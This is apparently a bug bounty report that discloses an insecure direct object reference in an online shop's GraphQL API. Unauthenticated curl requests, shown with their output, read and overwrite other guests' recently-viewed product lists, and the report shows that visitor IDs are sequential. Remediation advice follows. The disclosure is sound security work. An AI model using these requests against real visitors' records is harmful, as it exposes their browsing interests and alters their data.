## Summary:

The GraphQL API at ---- allows unauthenticated users to read and write guest recent-viewed data for any visitor_id via guestRecentViewedProducts and saveRecentViewedProducts endpoints. The visitor_id values appear sequential/predictable. This enables an attacker to retrieve or overwrite other guests' recently viewed product lists, resulting in privacy leaks of user interests and possible manipulation of personalization features.

## Steps To Reproduce:
1. Get a product ID (any product works):
   ```bash
   GQL="https://--------/graphql"
   UA="h1:<your_h1_username>"
   curl -s "$GQL" -H 'content-type: application/json' -H "user-agent: $UA" \
     -d '{"query":"{ products(search:\"cadbury\", pageSize:1, currentPage:1) { items { id sku name } } }"}'
   ```
   Sample output:
   ```json
   {"data":{"products":{"items":[{"id":7868,"sku":"Valentines_Rich_Dry_Fruit_Gift_Box_with_Teddy","name":"Cadbury Valentines Rich Dry Fruit Collection Gift Box with Teddy"}]}}}
   ```

2. Create a guest visitor record (unauthenticated):
   ```bash
   curl -s "$GQL" -H 'content-type: application/json' -H "user-agent: $UA" \
     -d '{"query":"mutation { saveRecentViewedProducts(input:{ productId: 7868 }) { success visitor_id } }"}'
   ```
   Sample output:
   ```json
   {"data":{"saveRecentViewedProducts":{"success":"product has been added successfully","visitor_id":111068599}}}
   ```

3. Read the guest recent-viewed list for that visitor_id:
   ```bash
   curl -s "$GQL" -H 'content-type: application/json' -H "user-agent: $UA" \
     -d '{"query":"{ guestRecentViewedProducts(visitor_id: 111068599, pageSize: 5) { total_count items { id sku name } } }"}'
   ```
   Sample output:
   ```json
   {"data":{"guestRecentViewedProducts":{"total_count":1,"items":[{"id":7868,"sku":"Valentines_Rich_Dry_Fruit_Gift_Box_with_Teddy","name":"Cadbury Valentines Rich Dry Fruit Collection Gift Box with Teddy"}]}}}
   ```

4. Write to an arbitrary visitor_id (no auth required):
   ```bash
   curl -s "$GQL" -H 'content-type: application/json' -H "user-agent: $UA" \
     -d '{"query":"mutation { saveRecentViewedProducts(input:{ visitorId: 999999123, productId: 7868 }) { success visitor_id } }"}'
   ```
   Sample output:
   ```json
   {"data":{"saveRecentViewedProducts":{"success":"product has been added successfully","visitor_id":null}}}
   ```

5. Read back that arbitrary visitor_id:
   ```bash
   curl -s "$GQL" -H 'content-type: application/json' -H "user-agent: $UA" \
     -d '{"query":"{ guestRecentViewedProducts(visitor_id: 999999123, pageSize: 5) { total_count items { id sku name } } }"}'
   ```
   Sample output:
   ```json
   {"data":{"guestRecentViewedProducts":{"total_count":1,"items":[{"id":7868,"sku":"Valentines_Rich_Dry_Fruit_Gift_Box_with_Teddy","name":"Cadbury Valentines Rich Dry Fruit Collection Gift Box with Teddy"}]}}}
   ```

6. Verify predictable IDs (repeat step 2; observed sequential increase):
   ```bash
   curl -s "$GQL" -H 'content-type: application/json' -H "user-agent: $UA" \
     -d '{"query":"mutation { saveRecentViewedProducts(input:{ productId: 7868 }) { success visitor_id } }"}'
   ```
   Sample output:
   ```json
   {"data":{"saveRecentViewedProducts":{"success":"product has been added successfully","visitor_id":111068608}}}
   ```

## Supporting Material/References:
Expected Result:
- The server should bind visitor_id to a session/cookie and reject or ignore arbitrary visitor_id values provided by the client.
- Unauthenticated clients should not be able to read or write other visitors' recent-viewed data.

Actual Result:
- Any unauthenticated client can read and write recent-viewed items for any visitor_id.
- visitor_id appears predictable (sequential), making enumeration feasible.

Remediation Suggestions:
- Use unguessable identifiers (UUIDv4) for visitor_id.
- Bind visitor_id to a secure session cookie and validate it server-side.
- Ignore/override any client-supplied visitorId in saveRecentViewedProducts.
- Add rate limiting and monitoring on guestRecentViewedProducts.
